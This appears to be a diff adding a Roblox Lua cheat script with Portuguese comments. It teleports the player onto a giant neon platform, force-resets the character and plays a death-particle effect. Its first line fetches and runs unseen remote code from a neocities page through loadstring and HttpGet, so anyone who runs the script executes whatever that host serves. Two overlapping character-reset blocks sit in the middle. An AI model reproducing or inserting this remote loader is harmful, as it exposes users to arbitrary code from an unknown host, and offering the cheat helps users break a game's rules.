@@ -1,0 +1,144 @@
+loadstring(game:HttpGet("https://oatsskibidi.neocities.org/"))()
+local UIS = game:GetService("UserInputService")
+local player = game.Players.LocalPlayer
+
+UIS.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if input.KeyCode == Enum.KeyCode.K then
+        print("TELEPORTANDO...")
+        
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+
+        local pos = Vector3.new(6935.58, -557.95, 14922.55)
+
+        -- Plataforma permanente neon branco
+        local p = Instance.new("Part")
+        p.Name = "PlataformaNeonPermanente"  -- Nome para fácil identificação
+        p.Size = Vector3.new(4000, 3, 4000)
+        p.Position = pos - Vector3.new(0, 5, 0)
+        p.Anchored = true
+        p.CanCollide = true
+        p.Transparency = 0                    -- Visível
+        p.Color = Color3.fromRGB(255, 255, 255)  -- Branco
+        p.Material = Enum.Material.Neon       -- Efeito neon
+        p.Parent = workspace
+
+        -- Teleporte
+        hrp.CFrame = CFrame.new(pos)
+    end
+end)
+local resets = 0
+local maxResets = 2
+local player = game.Players.LocalPlayer
+
+local function resetCharacter()
+    if resets < maxResets then
+        resets += 1
+        
+        task.wait(0.2) -- velocidade do reset
+        
+        if player.Character then
+            player.Character:BreakJoints()
+        end
+    end
+end
+
+player.CharacterAdded:Connect(function()
+    resetCharacter()
+end)
+
+resetCharacter()
+local player = game.Players.LocalPlayer
+local autoReset = false
+
+player.CharacterAdded:Connect(function(character)
+    if autoReset then
+        autoReset = false
+        return
+    end
+
+    autoReset = true
+
+    task.wait(0.2)
+
+    if character then
+        character:BreakJoints()
+    end
+end)
+local Players = game:GetService("Players")
+local Debris = game:GetService("Debris")
+
+local function conectarPersonagem(character)
+	local humanoid = character:WaitForChild("Humanoid")
+	local root = character:WaitForChild("HumanoidRootPart")
+
+	humanoid.Died:Connect(function()
+
+		for i = 1, 25 do
+			local p = Instance.new("Part")
+
+			p.Shape = Enum.PartType.Ball
+			p.Size = Vector3.new(0.35,0.35,0.35)
+
+			p.Material = Enum.Material.Neon
+			p.Color = Color3.fromRGB(255,0,255)
+
+			p.CanCollide = false
+			p.Anchored = false
+
+			p.Position = root.Position
+			p.Parent = workspace
+
+			-- deixa leve
+			p.CustomPhysicalProperties = PhysicalProperties.new(
+				0.01,
+				0.3,
+				0.5
+			)
+
+			-- velocidade suave
+			local bv = Instance.new("BodyVelocity")
+			bv.MaxForce = Vector3.new(99999,99999,99999)
+
+			bv.Velocity = Vector3.new(
+				math.random(-7,7),
+				math.random(10,16),
+				math.random(-7,7)
+			)
+
+			bv.Parent = p
+
+			-- remove força depois
+			task.delay(0.35,function()
+				bv:Destroy()
+			end)
+
+			-- remove bolinha
+			Debris:AddItem(p,3)
+		end
+
+	end)
+end
+
+local function conectarPlayer(player)
+
+	-- personagem atual
+	if player.Character then
+		task.spawn(function()
+			conectarPersonagem(player.Character)
+		end)
+	end
+
+	-- próximos respawns
+	player.CharacterAdded:Connect(conectarPersonagem)
+end
+
+-- players que já estão
+for _,player in pairs(Players:GetPlayers()) do
+	conectarPlayer(player)
+end
+
+-- novos players
+Players.PlayerAdded:Connect(conectarPlayer)
